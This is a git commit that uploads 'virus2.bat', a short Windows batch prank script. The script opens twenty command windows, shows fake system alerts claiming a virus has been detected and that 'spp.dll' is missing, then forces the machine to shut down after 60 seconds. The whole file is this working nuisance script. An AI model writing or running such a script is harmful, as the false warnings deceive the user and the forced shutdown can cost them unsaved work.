02dcea23f99259e1949971821b0bf1573f30ea50
SaurontheMighty <52637731+SaurontheMighty@users.noreply.github.com>
2019-08-07 17:46:39 -0400

    Add files via upload

---
+++ virus2.bat
@@ -0,0 +1,25 @@
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+@echo off
+echo Message here.
+msg * Windows has detected a virus
+msg * File missing. "spp.dll" not found
+shutdown -s -f -t 60 -c "Shutting down..."
